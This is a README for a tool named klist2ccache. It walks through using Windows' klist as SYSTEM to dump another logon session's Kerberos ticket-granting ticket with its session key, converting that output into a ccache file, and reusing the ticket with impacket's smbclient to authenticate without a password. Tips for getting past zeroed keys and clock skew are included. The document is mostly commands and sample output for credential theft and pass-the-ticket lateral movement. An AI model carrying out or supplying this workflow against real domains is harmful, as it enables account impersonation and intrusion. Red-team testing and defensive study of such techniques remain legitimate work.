# klist2ccache

Windows' built-in `klist` binary supports dumping Kerberos TGTs. This tool converts the binary's output to ccache format for use with impacket and other Linux Kerberos tooling.

List sessions:
```cmd
C:\Windows\System32>klist sessions

Current LogonId is 0:0x3e7
[0] Session 1 0:0x15d6ed LUMON\jotter Negotiate:Interactive
[1] Session 1 0:0x154333 LUMON\jotter Kerberos:Interactive
[2] Session 0 0:0x3e5 NT AUTHORITY\LOCAL SERVICE Negotiate:Service
[3] Session 1 0:0x11ad7 Window Manager\DWM-1 Negotiate:Interactive
[4] Session 1 0:0x11a78 Window Manager\DWM-1 Negotiate:Interactive
[5] Session 0 0:0x3e4 LUMON\jotter-pc$ Negotiate:Service
[6] Session 1 0:0xb248 Font Driver Host\UMFD-1 Negotiate:Interactive
[7] Session 0 0:0xb23d Font Driver Host\UMFD-0 Negotiate:Interactive
[8] Session 0 0:0xa748 \ NTLM:(0)
[9] Session 0 0:0x3e7 LUMON\jotter-pc$ Negotiate:(0)
```
Dump ticket (session key will be zeroed with improper perms):
```cmd
C:\Windows\System32>klist tgt -li 0x154333

Current LogonId is 0:0x3e7
Targeted LogonId is 0:0x154333

Cached TGT:

ServiceName        : krbtgt
TargetName (SPN)   : krbtgt
ClientName         : jotter
DomainName         : LUMON.COM
TargetDomainName   : LUMON.COM
AltTargetDomainName: LUMON.COM
Ticket Flags       : 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
Session Key        : KeyType 0x12 - AES-256-CTS-HMAC-SHA1-96
                   : KeyLength 32 - 80 31 1f 9e d7 f9 6c 0f 6a 67 18 c1 8d 12 1a ec fd b4 68 21 39 99 f3 9b 89 74 58 c9 94 87 e6 ba
StartTime          : 3/6/2026 19:07:09 (local)
EndTime            : 3/7/2026 5:07:09 (local)
RenewUntil         : 3/13/2026 9:22:16 (local)
TimeSkew           :  - 0:05 minute(s)
EncodedTicket      : (size: 1162)
0000  61 82 04 86 30 82 04 82:a0 03 02 01 05 a1 0c 1b  a...0...........
<SNIP>
```

Copy the stdout of `klist tgt` and feed to script:

```bash
python klist2ccache.py -i tgt.txt

[*] Parsed ticket:
    client     : JOTTER-PC$@LUMON.COM
    server     : krbtgt/LUMON.COM@LUMON.COM
    key_type   : 18
    key        : 74f62dc212216c910b<SNIP>dc964137c70fb8f476b22852db398
    flags      : 0x40e10000
    start_time : 2026-03-06 17:44:00+00:00
    end_time   : 2026-03-07 03:44:00+00:00
    renew_till : 2026-03-13 08:13:41+00:00
    ticket     : 1229 bytes

[+] ccache written → JOTTER-PC$@LUMON.COM.ccache  (1450 bytes)

[*] Use with impacket:
    export KRB5CCNAME=JOTTER-PC$@LUMON.COM.ccache
    smbclient.py -k -no-pass <domain>/<user>@<target>
```

---

## Troubleshooting

**`KRB_AP_ERR_BAD_INTEGRITY`**
Session key is wrong. Make sure you ran `klist` as SYSTEM with `-li`.

**`[-] Could not extract ticket bytes`**
The input doesn't contain the `EncodedTicket` hex dump. Make sure you captured the full output of `klist tgt`, not just `klist`.

**`[!] WARNING: session key is all-zeros`**
You ran `klist` as a normal user. The key is hidden. Run as SYSTEM.

**Clock skew errors**
Kerberos requires clocks within 5 minutes. Sync your Linux machine: `sudo ntpdate <dc>` or `sudo timedatectl set-ntp true`.
